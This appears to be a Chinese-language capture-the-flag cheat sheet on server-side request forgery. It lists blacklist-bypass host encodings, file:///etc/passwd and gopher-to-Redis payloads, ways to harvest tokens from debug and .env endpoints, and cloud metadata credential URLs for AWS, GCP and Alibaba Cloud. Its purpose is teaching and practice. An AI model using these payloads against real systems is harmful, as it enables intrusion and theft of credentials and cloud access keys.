# SSRF

## 先确认"真的发出去了"

特征是**响应里带回了目标的信息**：状态码、Content-Length、响应体预览、标题、错误文本。
拿一个你自己可访问的地址试（本地起的 HTTP 服务、或题目自身另一个端口），确认回显链路。

## 内网探测（用错误类型区分）

| 错误 | 含义 |
|---|---|
| `Name or service not known` / `NameResolutionError` | 主机不存在 |
| `Connection refused` | 主机在，端口没开 |
| 超时 | 可能有防火墙 / 端口被丢弃 |
| 返回内容 | 服务在，且可读 |

## 黑名单绕过（关键字匹配型）

```
http://127.0.0.1 → 127.1 / 0x7f000001 / 2130706433 / 017700000001 / 0 / 0.0.0.0
http://[::1] → [::ffff:127.0.0.1] / [::ffff:7f00:1] / [0:0:0:0:0:ffff:7f00:1]
http://internal-svc → internal%2dsvc / internal%2Dsvc / internal%252dsvc
                      （过滤器看原文，HTTP 客户端解码后才连 —— 把任意字符做百分号编码即可）
http://localhost → LOCALHOST / localhost. / localhost%00.example.com
任意域名 → 你控制的 DNS 解析到 127.0.0.1（如 nip.io / sslip.io）
```

**关键差异点**：黑名单通常只检查 `host`，不检查 path/query ——
所以 `http://allowed.com/internal-...` 这类在 path 里带关键字的写法也不会被拦。

## 协议面

```
file:///etc/passwd            （php/curl 后端常见）
gopher://127.0.0.1:6379/_...  （打 Redis/MySQL/SMTP 的万能跳板）
dict://127.0.0.1:6379/info
http://127.0.0.1:6379/       （直接当 HTTP 打某些服务）
```

后端是 `requests`/`urllib` 时 `file://` 一般不可用；是 `curl`/`file_get_contents` 时常可用。

## 拿到 SSRF 之后（这一步才是得分点）

1. **读配置类端点**：`/debug/config`、`/debug/vars`、`/status`、`/health`、`/metrics`、`/.env`
   → 常直接吐 token / 数据库口令 / 内部地址
2. **用泄露的凭据打受保护接口**，注意凭据的**消费位置**：
   - 有的接口只认 **查询参数**（`?token=`），有的只认 **请求头**
   - 代理类接口（`/probe`、`/fetch`）通常**不转发**浏览器的 Cookie/自定义头 → 只能用 query
3. **枚举内部路由**：404 vs 401/403 的差异就是"路由存在"的证据
4. **横向**：内网还有别的服务（数据库、缓存、元数据服务）时，配合 `gopher` 打协议层

## 云环境

```
http://169.254.169.254/latest/meta-data/           AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/  GCP（需 Metadata-Flavor: Google）
http://100.100.100.200/latest/meta-data/           阿里云
```
